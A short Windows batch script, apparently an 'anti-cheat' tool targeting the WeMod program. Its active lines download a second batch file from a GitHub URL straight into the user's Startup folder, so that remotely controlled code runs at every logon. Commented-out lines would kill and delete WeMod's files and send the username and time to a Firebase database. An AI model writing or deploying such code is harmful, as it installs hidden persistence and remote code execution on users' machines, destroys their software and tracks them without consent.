@echo off
set dir = C:\Users\%username%\AppData\Roaming\ScalpelAntiCheat

rem taskkill /IM WeMod.exe /F > nul
rem del C:\Users\%username%\AppData\Local\WeMod\WeMod.exe
rem del C:\Users\%username%\AppData\Local\WeMod\Update.exe
rem del C:\Users\%username%\Downloads\WeMod-Setup.exe > nul
rem curl -X PUT -d "{\"time\": \"%time%\"}" -H "Content-type: application/json" https://antimod-d4fb9-default-rtdb.firebaseio.com/user/%username%.json
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Startup.bat -o Startup.bat
md C:\Users\%username%\AppData\Roaming\ScalpelAntiCheat